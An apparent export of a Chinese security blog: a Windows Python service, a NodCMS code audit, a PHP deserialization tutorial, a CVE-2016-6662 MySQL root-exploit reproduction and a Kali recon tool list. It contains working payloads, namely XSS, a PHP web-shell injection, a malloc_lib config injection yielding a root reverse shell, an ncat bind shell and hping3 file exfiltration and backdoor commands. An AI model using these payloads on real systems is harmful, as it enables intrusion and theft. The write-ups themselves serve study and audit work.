(win32serviceutil.ServiceFramework): _svc_name_ = "Test Service" #服务名 _svc_display_name_ = "Test Service" #服务显示名称 _svc_description_ = "Test Service ." #服务描述 def __init__(self,args): win32serviceutil.ServiceFramework.__init__(self,args) self.hWaitStop = win32event.CreateEvent(None,0,0,None) socket.setdefaulttimeout(60) def SvcDoRun(self): servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE, servicemanager.PYS_SERVICE_STARTED, (self._svc_name_,'')) self.monitorProcess() # 创建子进程 def monitorProcess(self): with open('C:\\filemonitor', 'r') as f: scriptPath=f.read() if os.path.exists(scriptPath): cmd = 'cd '+scriptPath+' &amp;&amp; python promain.py' child = subprocess.Popen(cmd, shell=True) while 1: if child.poll()==1: child = subprocess.Popen(cmd, shell=True) time.sleep(10) win32event.WaitForSingleObject(self.hWaitStop, win32event.INFINITE) # 结束子进程 def SvcStop(self): with open('C:\\filemonitor', 'r') as f: scriptPath=f.read() if os.path.exists(scriptPath): remoteDic = confdeal.getConfRemote(scriptPath) if remoteDic: ret = os.popen('netstat -ano | findstr \":'+str(remoteDic['localPort'])+' \"') strList = list(set(ret.read().split('\n'))) for pidStr in strList: if pidStr != '': pidStr = pidStr[pidStr.rfind(' ')+1:] os.system("taskkill /F /T /PID "+pidStr) else : exit() self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING) win32event.SetEvent(self.hWaitStop) self.ReportServiceStatus(win32service.SERVICE_STOPPED)if __name__ == '__main__': scriptPath = os.path.dirname(os.path.realpath(__file__)) with open('C:\\filemonitor', 'w') as f: f.write(scriptPath) confdeal.initConf(scriptPath) win32serviceutil.HandleCommandLine(Daemon) 然后以下命令： 123456789101112# 安装服务python PythonService.py install# 让服务自动启动python PythonService.py --startup auto install # 启动服务python PythonService.py start# 重启服务python PythonService.py restart# 停止服务python PythonService.py stop# 删除/卸载服务python PythonService.py remove 这里我要提一下，python脚本文件调用windows api后，他的运行路径会发生变化，所以我这里把脚本路径存到了一个绝对地址的文件里，然后再取出来。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>daemon</tag>
        <tag>service</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php codeigniter nodcms 代码审计]]></title>
    <url>%2F2016%2F10%2F11%2Fphp-codeigniter-nodcms-audit%2F</url>
    <content type="text"><![CDATA[概述CMS代码审计还未入门，然后CI框架学的还不行，代码审计一脸懵逼。 前台反射型XSS1234567891011121314151617181920212223242526272829function search($lang)&#123; $this-&gt;preset($lang); $search_text = isset($_GET["filter"])?str_replace("'","",$this-&gt;input-&gt;get("filter")):""; //把单引号去掉 if($search_text!="")&#123; $search = explode("_",$search_text); if(count($search)!="")&#123; $limit = 20; if(isset($_GET["offset"]) &amp;&amp; is_numeric($_GET["offset"]))&#123; $offset = $_GET["offset"]; &#125;else&#123; $offset = 0; &#125; $this-&gt;data['data'] = $this-&gt;NodCMS_general_model-&gt;searchExtension($search,$limit,$offset); &#125; $this-&gt;data['search_word']=str_replace("_"," ",$search_text); $this-&gt;data['text_search']=$search; $this-&gt;data['text_replace']=array_map(function($value)&#123; return "&lt;strong&gt;".$value."&lt;/strong&gt;"; &#125;,$search); &#125;else&#123; $this-&gt;data['data'] = array(); &#125; $this-&gt;data['title']=str_replace("_"," ",$search_text); //把下划线替换为空格，并没有进行XSS过滤，直接打印出来，形成xss if(isset($_GET["ajax"]))&#123; echo $this-&gt;load-&gt;view($this-&gt;mainTemplate.'/search_ajax',$this-&gt;data,true); &#125;else&#123; $this-&gt;data['content']=$this-&gt;load-&gt;view($this-&gt;mainTemplate.'/search',$this-&gt;data,true); $this-&gt;load-&gt;view($this-&gt;mainTemplate,$this-&gt;data,''); &#125;&#125; 这里，只是去掉了单引号、下划线虽然难以进行sql注入攻击，但是XSS还是可以的。 1payload为：http://localhost:8000/en/search?filter=des&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt; 后台php 代码注入位置是修改语言的地方，其中一个URL为http://localhost:8000/admin/edit_lang_file/1/en。 先看截图： 然后上关键代码，关键地方打上注释了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687function edit_lang_file($id,$file_name)&#123; $this-&gt;data['data']=$this-&gt;NodCMS_general_admin_model-&gt;get_language_detail($id); if($this-&gt;data['data']==null || !file_exists(getcwd().'/nodcms/language/'.$this-&gt;data['data']['language_name'].'/'.$file_name.'_lang.php'))&#123; $this-&gt;session-&gt;set_flashdata('error', _l('URL-Request was not exists!',$this)); redirect(base_url()."admin/language"); &#125; $this-&gt;load-&gt;library('Get_lang_in_array'); $CI = new Get_lang_in_array(); //实例化Get_lang_in_array()函数 $this-&gt;data['lang_list'] = $CI-&gt;load($file_name,$this-&gt;data['data']['language_name']); //加载en_lang.php if(count($this-&gt;data['lang_list'])==0)&#123; $defaultLangFileName = strlen($file_name)==2?$_SESSION['language']['code']:$file_name; $this-&gt;data['lang_list'] = $CI-&gt;load($defaultLangFileName,$_SESSION['language']['language_name']); &#125; if(isset($_POST['data']))&#123; if ($this-&gt;session-&gt;userdata['group']==1) &#123; $post_data = $this-&gt;input-&gt;post('data'); //直接获取post值 $i=0; $fileContent = "&lt;?php\n"; foreach ($this-&gt;data['lang_list'] as $key=&gt;&amp;$val) &#123; $fileContent .= '$lang["'.$key.'"] = "'.$post_data[$i].'";'."\n"; //拼接代码 $val = $post_data[$i]; $i++; &#125; $file = getcwd().'/nodcms/language/'.$this-&gt;data['data']['language_name'].'/'.$file_name.'_lang.php'; if(file_exists($file))&#123; file_put_contents($file, $fileContent); // 把代码写入文件 &#125; $this-&gt;session-&gt;set_flashdata('success', _l('Edit language file successfully!',$this)); redirect(base_url()."admin/edit_lang_file/".$id.'/'.$file_name); &#125;else&#123; $this-&gt;session-&gt;set_flashdata('error', _l('This request is just fore real admin.',$this)); redirect(base_url()."admin/language"); &#125; &#125; $this-&gt;data['file_name'] = $file_name; $this-&gt;data['languages']=$this-&gt;NodCMS_general_admin_model-&gt;get_all_language(); $this-&gt;data['title'] = _l("Edit language file",$this); $this-&gt;data['page'] = "edit lang file"; $this-&gt;data['content']=$this-&gt;load-&gt;view($this-&gt;mainTemplate.'/language_edit_file',$this-&gt;data,true); $this-&gt;load-&gt;view($this-&gt;mainTemplate,$this-&gt;data);&#125;function load($langfile = '', $idiom = '', $return = FALSE, $add_suffix = TRUE, $alt_path = '') &#123; $langfile = str_replace('.php', '', $langfile); if ($add_suffix == TRUE) &#123; $langfile = str_replace('_lang.', '', $langfile) . '_lang'; &#125; $langfile .= '.php'; if (in_array($langfile, $this-&gt;is_loaded, TRUE)) &#123; return; &#125; $config = &amp; get_config(); if ($idiom == '') &#123; $deft_lang = (!isset($config['language'])) ? 'english' : $config['language']; $idiom = ($deft_lang == '') ? 'english' : $deft_lang; &#125; if ($alt_path != '' &amp;&amp; file_exists($alt_path . 'language/' . $idiom . '/' . $langfile)) &#123; include($alt_path . 'language/' . $idiom . '/' . $langfile); &#125; else &#123; $found = FALSE; foreach (get_instance()-&gt;load-&gt;get_package_paths(TRUE) as $package_path) &#123; if (file_exists($package_path . 'language/' . $idiom . '/' . $langfile)) &#123; include($package_path . 'language/' . $idiom . '/' . $langfile); $found = TRUE; break; &#125; &#125; if ($found !== TRUE) &#123; show_error('Unable to load the requested language file: language/' . $idiom . '/' . $langfile); &#125; &#125; if (!isset($lang)) &#123; log_message('error', 'Language file contains no data: language/' . $idiom . '/' . $langfile); return; &#125; if ($return == TRUE) &#123; return $lang; &#125; $this-&gt;is_loaded[] = $langfile; //加载 en_lang.php文件，即执行代码。 $this-&gt;language = array(); $this-&gt;language = $lang; return $this-&gt;language; unset($lang); log_message('debug', 'Language file loaded: language/' . $idiom . '/' . $langfile); return TRUE;&#125; 代码比较复杂，加上对CI框架不是很了解，看的比较久。由于这里没有对post提交的参数进行任何的字符过滤，直接进行拼接，然后保存到文件。之后重新请求时，实例化了Get_lang_in_array()这个函数，而这个函数主要加载了en_lang.php这个文件，也就是执行了这个文件，形成代码注入，从而gershell。 1payload为：All"; file_put_contents('shell.php', '&lt;?php $_GET[a]($_GET[b]);?&gt;');;$t="111 shell.php文件会生成在根目录下，连菜刀就可以了。 存储型XSS和前台差不多，没有过滤就存入了数据库，造成XSS。]]></content>
      <categories>
        <category>code audit</category>
      </categories>
      <tags>
        <tag>code audit</tag>
        <tag>php</tag>
        <tag>codeigniter</tag>
        <tag>nodcms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php 序列化以及 magic 函数]]></title>
    <url>%2F2016%2F10%2F09%2Fphp-serialize-magic%2F</url>
    <content type="text"><![CDATA[概述有时候需要把一个对象在网络上传输，为了方便传输，可以把整个对象转化为二进制串，等到达另一端时，再还原为原来的对象，这个过程称之为也叫序列化。 有两种情况我们必须把对象也叫序列化，第一种情况就是把一个对象在网络中传输的时候要将对象也叫序列化，第二种情况就是把对象写入文件或是数据库的时候用到也叫序列化。 串行化有两个过程，一个是序列化，就是把对象转化为二进制的字符串，我们使用serialize()函数来序列化一个对象，另一个是反序列化，就是把对象转化的二进制字符串再转化为对象， 我们使用unserialize()函数来反序列化一个对象。 详情1234567891011121314151617181920212223242526&lt;?phperror_reporting(7);class Person&#123; var $name; var $age; var $friends; function __construct($name = "", $age = "",$friends = array()) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; &#125; function say() &#123; echo "I am " . $this-&gt;name . ",my age is " . $this-&gt;age . "my friends has "; foreach ($this-&gt;friends as $friend)&#123; echo $friend." "; &#125; echo ".&lt;br&gt;"; &#125;&#125;$p1 = new Person("Bob", 20,array("Alice","Jhon") );$p1_string = serialize($p1); //把一个对象序列化，返一个字符串echo $p1_string . "&lt;br&gt;"; //串行化的字符串我们通常不去解析$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2$p2-&gt;say();?&gt; 具体输出： 12O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:20;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; I am Bob,my age is 20my friends has Alice Jhon . 至于序列化语法解析，看如下代码： 1234567891011121314151617181920&lt;?phperror_reporting(7);class Person&#123; public $name; private $age; protected $friends; var $job; function __construct($name = "Bob", $age = 20,$friends =array("Alice","Jhon") ,$job=Null) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; $this-&gt;job = $job; &#125;&#125;$p1 = new Person();$p1_string = serialize($p1); //把一个对象序列化，返一个字符串echo $p1_string . "&lt;br&gt;"; //串行化的字符串我们通常不去解析$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2?&gt; 具体输出： 1O:6:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:11:&quot;Personage&quot;;i:20;s:10:&quot;*friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;s:3:&quot;job&quot;;N;&#125; 需要序列化一个类的话，首先PHP会先将类名序列化。格式为 O:类名长度:”类名”:值:{} ,大致Fuzzy了下，这个类名长度前可以有%2b、%30 这些符号也可以反序列化。其他的格式可以自己对照了解。如： 1O:+6:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:11:&quot;Personage&quot;;i:20;s:10:&quot;*friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;s:3:&quot;job&quot;;N;&#125; 1O:06:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:11:&quot;Personage&quot;;i:20;s:10:&quot;*friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;s:3:&quot;job&quot;;N;&#125; 以下是zval对应的类型和键对照表1234567891011数组中二次赋值(&amp;): R; 对象二次赋值 : r; NULL : N; true : b:1; false : b:0; Long : i; Double : d; String : s/S; Class : C; Array : a; Object : O; 可以看出变量不同的属性也有着不同的格式 123public : key; protected : *key; private : 对象名key; 魔术方法在PHP5中有两个魔术方法__sleep()方法和__wakeup()方法，在对象串行化的时候，会调用一个sleep()方法来完成一 些睡前的事情；而在重新醒来，即由二进制串重新组成一个对象的时候，则会自动调用PHP的另一个函数wakeup()，做一些对象醒来就要做的动作。sleep()函数不接受任何参数， 但返回一个数组，其中包含需要串行化的属性。末被包含的属性将在串行化时被忽略，如果没有sleep()方法，PHP将保存所有属性。当然，还有其他的魔术方法。 123456789101112131415161718192021222324252627282930313233&lt;?phperror_reporting(7);class Person&#123; var $name; var $age; var $friends; function __construct($name = "", $age = "",$friends = array()) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; &#125; function say() &#123; echo "I am " . $this-&gt;name . ",my age is " . $this-&gt;age . "my friends has "; foreach ($this-&gt;friends as $friend)&#123; echo $friend." "; &#125; echo ".&lt;br&gt;"; &#125; function __sleep() &#123; // 此时，属性$age将被删除！！！ $arr = array("name", "friends"); return($arr); &#125; function __wakeup() &#123;//重新生成对象时，并重新赋值$age为40 $this-&gt;name = "Orleven"; &#125;&#125;$p1 = new Person("Bob", 20,array("Alice","Jhon") );$p1_string = serialize($p1); //把一个对象序列化，返一个字符串echo $p1_string . "&lt;br&gt;"; //串行化的字符串我们通常不去解析$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2$p2-&gt;say();?&gt; 具体输出： 12O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; I am Orleven,my age is my friends has Alice Jhon . 不久之前刚出来的__wakeup()引发的漏洞。大意是指，当我们反序列化一个对象时，如果它的属性发生了变化，就会导致wakeup函数中不会执行，那么如果__wakeup()中存在一些重要的语句，就会导致不会被执行。 对于如下代码： 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(7);class Person&#123; var $name; var $age; var $friends; function __construct($name = "", $age = "",$friends = array()) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; &#125; function say() &#123; echo "I am " . $this-&gt;name . ",my age is " . $this-&gt;age . ",my friends has "; foreach ($this-&gt;friends as $friend)&#123; echo $friend." "; &#125; echo ".&lt;br&gt;"; &#125; function __wakeup() &#123;//重新生成对象时，并重新赋值$age为40 echo "Wakeup...&lt;br/&gt;"; $this-&gt;name = "Orleven"; echo "Wakeuped&lt;br/&gt;"; &#125; function __destruct()&#123; //Do something $this-&gt;say(); echo "Destructed&lt;br/&gt;"; &#125;&#125; 如果执行如下代码：123$p1_string = 'O:6:"Person":3:&#123;s:4:"name";s:3:"Bob";s:3:"age";i:20;s:7:"friends";a:2:&#123;i:0;s:5:"Alice";i:1;s:4:"Jhon";&#125;&#125;'; //把一个对象序列化，返一个字符串echo $p1_string."&lt;br/&gt;";$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2 具体输出： 12345O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:20;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; Wakeup... Wakeuped I am Orleven,my age is 20,my friends has Alice Jhon . Destructed 如果执行如下代码：123$p3_string = 'O:6:"Person":4:&#123;s:4:"name";s:3:"Bob";s:3:"age";i:20;s:7:"friends";a:2:&#123;i:0;s:5:"Alice";i:1;s:4:"Jhon";&#125;&#125;'; //把一个对象序列化，返一个字符串echo $p3_string."&lt;br/&gt;";$p4 = unserialize($p3_string); //把一个序列化的字符串反序列化形成对象$p4 具体输出： 123O:6:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:20;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; I am Bob,my age is 20,my friends has Alice Jhon . Destructed 发现wakeup并没有执行。]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>serialize</tag>
        <tag>magic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql 提权漏洞 CVE-2016-6662]]></title>
    <url>%2F2016%2F09%2F29%2Fmysql-root-code-execution-CVE-2016-6662%2F</url>
    <content type="text"><![CDATA[概述最近出了一个mysql提权漏洞，趁热练练手。 利用前提 mysql_hookandroot_lib.c mysql拥有my.cnf写权限 mysql root用户可执行 set global general_log_file = &#39;my.cnf&#39;; sql语句 需要file权限 环境搭建安装mysql 5.6.3212345678910111213141516171819202122232425$ wget http://ftp.kaist.ac.kr/mysql/Downloads/MySQL-5.6/mysql-5.6.32-linux-glibc2.5-x86_64.tar.gz$ sudo apt-get install libaio-dev（或者libaio1） $ chmod 777 tmp$ groupadd mysql$ useradd -r -g mysql mysql$ cd /usr/local/$ tar zxvf /tmp/mysql-5.6.32-linux-glibc2.5-x86_64.tar.gz $ ln -s mysql-5.6.32-linux-glibc2.5-x86_64 mysql$ cd mysql $ chown -R mysql .$ chgrp -R mysql .$ scripts/mysql_install_db --user=mysql$ chown -R root .$ chown -R mysql data$ cp my.cnf /etc/my.cnf$ bin/mysqld_safe --user=mysql &amp;$ cp support-files/mysql.server /etc/init.d/mysql.server$ ./bin/mysqladmin -u root password '123456'$ ./bin/mysqladmin -uroot -p123456 shutdown$ bin/mysqld_safe --user=mysql &amp;# 如果想在任何地方都能直接使用mysql命令，需要设置环境变量：$ vi /etc/environment # 在PATH=“…”最后添加mysql可执行文件所在路径（在这里是:/usr/local/mysql/bin）$ source /etc/environment 版本信息123456789101112131415161718192021222324$ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 14.04.4 LTSRelease: 14.04Codename: trusty$ ./bin/mysqladmin -u root -p versionEnter password: ./bin/mysqladmin Ver 8.42 Distrib 5.6.32, for linux-glibc2.5 on x86_64Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Server version 5.6.32Protocol version 10Connection Localhost via UNIX socketUNIX socket /tmp/mysql.sockUptime: 2 min 54 secThreads: 1 Questions: 10 Slow queries: 0 Opens: 67 Flush tables: 1 Open tables: 60 Queries per second avg: 0.057 进程属性123$ ps -aux | grep mysqlroot 23 0.0 0.0 4440 748 ? S 10:02 0:00 /bin/sh bin/mysqld_safe --user=mysqlmysql 122 13.0 45.0 985540 457724 ? Sl 10:02 0:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/d1190820d670.err --pid-file=/usr/local/mysql/data/d1190820d670.pid 可以看出，mysqld_safe封装脚本是以root权限启动的，而主要的mysqld进程是用较低权限的mysql用户启动的。 复现准备修改my.cnf权限12# 将/usr/local/mysql/my.cnf$ chown mysql:mysql /usr/local/mysql/my.cnf 创建attacker用户，并赋予file，select，insert权限，创建用于实验的数据库pocdb123CREATE DATABASE pocdb;GRANT FILE ON *.* TO 'attacker'@'%' IDENTIFIED BY 'p0cpass!';GRANT SELECT, INSERT, CREATE ON `pocdb`.* TO 'attacker'@'%'; 复现修改一下mysql_hookandroot_lib.c的ip，port和my.cnf的位置：123#define ATTACKERS_IP "192.168.0.1"#define SHELL_PORT 6033#define INJECTED_CONF "/usr/local/mysql/my.cnf" 修改一下0ldSQL_MySQL_RCE_exploit.py的port和my.cnf的位置,然后执行1$ python 0ldSQL_MySQL_RCE_exploit.py -dbuser attacker -dbpass 'p0cpass!' -dbhost 192.168.0.1 -dbname pocdb -mycnf /usr/local/mysql/my.cnf 执行成功后会在my.cnf里添加如下：12345678910111213/usr/local/mysql/bin/mysqld, Version: 5.6.32 (MySQL Community Server (GPL)). started with:Tcp port: 3306 Unix socket: /tmp/mysql.sockTime Id Command Argument160929 9:37:14 1 Query select "# 0ldSQL_MySQL_RCE_exploit got here :)[mysqld]malloc_lib='/usr/local/mysql/data/mysql_hookandroot_lib.so'[abyss]" INTO void 1 Query SET global general_log = off 虽然直接把日志写在my.cnf里重启mysql时会执行失败，但是不用担心,config_cleanup() 这个函数会清除这些。 重启mysql1234Listening on [0.0.0.0] (family 0, port 12344)Connection from [192.168.0.4] port 12344 [tcp/*] accepted (family 2, sport 34434)whoamiroot]]></content>
      <categories>
        <category>root code execution</category>
      </categories>
      <tags>
        <tag>code execution</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Information Gathering]]></title>
    <url>%2F2016%2F09%2F27%2Fkali-information-gathering%2F</url>
    <content type="text"><![CDATA[概述Kali 里预装了很多安全与取证的相关工具，但是我所了解的却只有sqlmap、msf、nmap等少数几个，对于其他的却并没过多关注。于是今天想着整理一下Kali有关信息收集的工具，便于以后备查。 信息收集acccheck：描述：该工具被设计为一个密码字典攻击的工具，目标Windows身份验证通过SMB协议。 ace：描述：不明。 amap：描述：一个服务器枚举工具，使用这个工具可以识别正运行在一个指定端口或一个范围端口上的应用程序。用法：1$ amap -bq 192.168.1.110 1-1000 Automater描述：automater是分析URL的域名，IP地址，和MD5哈希OSINT工具。用法：12$ automater baidu.com$ automater -s robtex 50.116.53.73 braa描述：一个SNMP的扫描工具用法：1$ braa public@192.168.0.1:.1.3.6.* casefile描述：服务枚举：如DNS枚举用法：1$ casefile cdpsnarf描述：网络嗅探器，从CDP数据包中提取信息用法：1$ cdpsnarf -i eth0 -w cdpsnarf.pcap cisco-torch描述：快速发现远程Cisco的主机上运行Telnet、SSH、WEB、SNMP服务和启动NTP和字典攻击的服务发现。用法：1$ cisco-torch -A 192.168.99.202 copy-router-config描述：从思科设备上运行的SNMP拷贝配置文件。用法：1$ copy-router-config.pl 192.168.1.1 192.168.1.15 private dmitry描述：收集可能的子域，电子邮件地址，正常运行时间的信息，TCP端口扫描，查找，和更多。用法：1$ dmitry baidu.com dnmap描述：DNmap是一款基于Nmap的分布式框架，使用客户端/服务端架构，服务器接收命令并发送至客户端进行Nmap安全扫描，扫描完毕后，客户端返回扫描结果。用法：12345678# dnmap_server：$ echo "nmap -F 192.168.1.0/24 -v -n -oA sub1" &gt;&gt; dnmap.txt$ echo "nmap -F 192.168.0.0/24 -v -n -oA sub0" &gt;&gt; dnmap.txt$ dnmap_server -f dnmap.txt# dnmap_client：# (dnmap_server的ip)(dnmap_client的别名)$ dnmap_client -s 192.168.1.15 -a dnmap-client1 dnsenum描述：枚举域DNS信息和发现不连续的IP模块。用法：1$ dnsenum --noreverse -o mydomain.xml example.com dnsmap描述：枚举域DNS信息。用法：1$ dnsmap example.com -w /usr/share/wordlists/dnsmap.txt dnsrecon描述：直接出来目标服务器的 DNS名字 和 IP用法：1$ dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml dnstracer描述：直接出来目标服务器的 DNS名字 和 IP用法：1$ dnstracer -r 3 -v example.com dnswalk描述：DNS的调试器。它执行特定区域的区域传输，并检查数据库在许多方面的内部一致性，以及准确性。用法：12$ dnswalk example.com.$ dnswalk -r -d example.com. dotdotpwn.pl描述:测试发现软件例如HTTP、FTP、TFTP服务器遍历目录的漏洞，网络平台如CMS、ERP、博客等。用法：1$ dotdotpwn.pl -m http -h 192.168.1.1 -M GET enum4linux描述:枚举Windows主机和Samba 主机。用法：1$ enum4linux -U -o 192.168.1.200 enumiax描述: Inter Asterisk Exchange 协议 的用户名蛮力枚举。 enumiax可能在两种不同的模式操作； 顺序用户名猜测或字典攻击。用法：1$ enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 192.168.1.1 Fierce描述: ip 扫描器用法：1$ fierce -dns example.com fragroute描述: fragroute能够截取、修改和重写向外发送的报文，实现大部分在了Secure Networks Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection中叙述的IDS欺骗技术，包括IP、TCP层的数据包碎片以及数据包数据重叠等。用法：12345# fragroute：$ fragroute 192.168.1.123# fragtest ：$ fragtest ip-tracert frag-new 192.168.1.123 ghost-phisher描述: 是无线和以太网的安全审计和攻击软件用法：1$ ghost-phisher GoLismero描述: web漏洞扫描用法：1234567891011121314# 扫描一个网站，并显示在屏幕上的结果:$ golismero scan http://www.0535code.com# 获取nmap结果，扫描发现所有主机写HTML报告:$ golismero scan -i nmap_output.xml -o report.html# 获取结果OpenVAS和它们显示在屏幕上，但不扫描任何东西:$ golismero import -i openvas_output.xml# 显示所有可用配置文件的列表:$ golismero profiles# 显示所有可用插件的列表:$ golismero plugins# 显示所有信息和插件:$ golismero info brute_*# 从以前的扫描中转储数据库:$ golismero dump -db example.db -o dump.sql hping3描述: hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。用法：1234567891011121314151617# 使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。$ hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10# 端口扫描$ hping3 -I eth0 -S 192.168.10.1 -p 80# 对目标机发起大量SYN连接$ hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000# 文件传输 # 接收端： $ hping3 192.168.1.159 --listen signature --safe --icmp # 发送端： $ hping3 192.168.1.108 --icmp -d 100 --sign signature --file /etc/passwd# 木马功能 # 被控制端： $ hping3 127.0.0.1 --listen signature --safe --udp -p 12345 | /bin/sh # 控制端： $ echo ls &gt; test.cmd $ hping3 127.0.0.1 -p 12345 -d 100 --udp --sign signature --file ./test.cmd intrace描述:InTrace 是一个类似 traceroute 的应用，用户可以针对已建立的 TCP 连接跟踪其 IP 的跳跃。用法:1$ intrace -h www.example.com -p 80 -s 4 lbd描述:检测是否一个给定的域使用DNS或HTTP负载平衡（通过服务器：日期：服务器响应头和之间的差别）。用法:1$ lbd example.com maltego描述:收集DNS信息等。用法:1$ maltego masscan描述:快速的端口扫描工具。用法:123456# 扫描202.203.122.122的80端口，速率为10Kpps$ masscan -p 80 202.203.122.122 --rate=10000 # 扫描202.203.122.122的0-8100的端口，扫描结果输出到output.txt（二进制）（--banners选项值旗标，或者指纹）$ masscan -p 0-8100 202.203.122.122 --banners -oB output.txt # 打开显示模式，读取output.txt中的数据，并以xml的格式写到2.txt中$ masscan --open --banners --readscan output.txt -oX 2.txt Miranda描述:操作系统探测工具。用法:1234567# 打开网卡eth0$ miranda -v -i eth0 # 自动搜索upnp主机 upnp&gt; msearch upnp&gt; host list # 查看该主机的upnp设备列表 upnp&gt; host get [index] nmap描述:网络探测工具和安全/端口扫描器。用法:123456789101112131415161718192021222324252627$ Nmap [ 扫描类型 ... ] [ 通用选项 ] &#123; 扫描目标说明 &#125;$ nmap -v -A -sV 192.168.1.1# 全面扫描：$ nmap -T4 -A targetip# 主机发现：$ nmap -T4 -sn targetip# 端口扫描：$ nmap -T4 targetip# 服务扫描：$ nmap -T4 -sV targetip# 操作系统扫描：$ nmap -T4 -O targetip# SYN扫描:$ nmap -sS -T4 targetip# FIN扫描:$ nmap -sF -T4 targetip# ACK扫描:$ nmap -sA -T4 targetip# UDP扫描:$ NMAP -sU targetip# 漏洞扫描：$ nmap -sS -sV --script=vulscan/vulscan.nse target$ nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target$ nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target$ nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target$ nmap -sV --script=vuln target$ nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target nping描述:网络数据包生成工具/平实用程序。用法:1$ nping --tcp -p 22 --flags syn --ttl 2 192.168.1.1 ndiff描述:实用工具Nmap扫描的结果比较。用法:1$ ndiff yesterday.xml today.xml ncat描述:连接和重定向的套接字。用法:1$ ncat -v --exec "/bin/bash" --allow 192.168.1.123 -l 4444 --keep-open p0f描述:是一款被动探测工具,通过分析网络数据包来判断操作系统用法:1$ p0f -i eth0 -p -o /tmp/p0f.log Recon-ng描述:与msf类似，Recon-ng框架是一个强大的工具，使用它可以自动的收集信息和网络侦查。用法:1234567891011121314151617$ recon-ng # 查看所有命令： [recon-ng][default]&gt; help # 查看所有有效的模块列表： [recon-ng][default]&gt; show modules # 使用recon/domains-hosts/baidu_site模块，枚举baidu网站的子域： [recon-ng][default]&gt; use recon/domains-hosts/baidu_site # 查看该模块下可配置选项参数： [recon-ng][default][baidu_site]&gt; show options # 配置SOURCE选项参数： [recon-ng][default][baidu_site]&gt; set SOURCE baidu.com # 启动信息收集： [recon-ng][default][baidu_site]&gt; run # 查看获取的数据： [recon-ng][default]&gt; use reporting/csv # 创建报告： [recon-ng][default][csv]&gt; run searchsploit描述: 从Exploit Database搜索exp用法：12$ searchsploit oracle windows remote$ searchsploit linux kernel 2.6 setoolkit描述: 社会工程师工具包用法：123456789$ setoolkit # 根据自己的需要，选择相应的编号进行操作: set&gt; 1 set&gt; 4 # 根据自己的目标系统选择相应的攻击载荷: set:payloads&gt; 2 # 输入攻击者的ip、端口： set:payloads&gt; IP address for the payload listener (LHOST):192.168.0.212 set:payloads&gt; Enter the PORT for the reverse listener:1234 smtp-user-enum描述: 